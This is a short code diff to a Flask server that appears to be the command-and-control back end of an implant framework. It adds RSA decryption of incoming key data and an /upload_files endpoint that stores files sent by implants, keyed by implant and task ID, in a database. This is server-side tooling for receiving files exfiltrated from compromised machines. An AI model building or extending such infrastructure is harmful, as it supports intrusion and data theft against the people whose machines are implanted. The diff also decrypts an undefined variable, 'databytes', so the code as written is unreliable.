@@ -277,7 +277,9 @@ def new_symkey():
     try:
         if (request.content_length < 512):
             data = request.get_data()
-            print(data)
+            data = RsaDecryption.rsadecrypt(databytes)
+            for x in range(len(data)):
+                print(data[x])
             # print(len(data))
             datastr = data.decode("utf-8")
             for x in (range(len(datastr))):
@@ -417,14 +419,27 @@ def get_history():
         print(e)
         return e, {'Access-Control-Allow-Origin': '*'}
 
-
 @app.route("/upload_files", methods=["POST"])
 def upload_files():
     print("Recieved upload_file")
     try:
-        print(request.headers.get('id'))
-        file = request.files
-        print(file)
+        task_id = request.headers.get('taskid')
+        implant_id = request.headers.get('implant_id')
+        files = request.files
+        theFile = None
+        name = None
+        for x in files:
+            theFile = files[x] 
+            name = x
+
+        print(task_id, implant_id, name)
+
+        columns = ['implant_id', 'file_name', 'data', 'task_id']
+        data = implant_id, name, theFile, task_id
+        query = tools.insertQueryBuilder("files", columns)
+        tools.executeInsertQuery(query, data) 
+
+
         print("recieved upload_files: \n Response: ")
         return "success", 200, {'Access-Control-Allow-Origin': '*'}
 
